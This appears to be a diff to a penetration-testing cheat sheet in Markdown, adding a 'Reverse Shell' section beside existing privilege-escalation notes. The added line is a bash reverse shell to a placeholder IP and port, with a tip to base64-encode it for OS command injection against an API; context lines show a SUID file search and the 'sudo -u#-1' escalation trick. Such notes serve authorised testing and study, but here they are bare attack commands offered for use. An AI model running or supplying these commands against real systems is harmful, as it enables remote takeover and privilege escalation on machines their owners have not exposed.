@@ -22,6 +22,11 @@ find / -perm -4000 2>/dev/null    # file with suid
 sudo -u#-1 /bin/bash
 ```
 
+### Reverse Shell
+```
+echo "bash -i >& /dev/tcp/[IP_ADDR]/[PORT] 0>&1" |bash    # base64 encode the echo cmd; use for os command injection (api)
+```
+
 ### Not So Important But May Be Useful (Default Location)
 ```
 /proc/cpuinfo
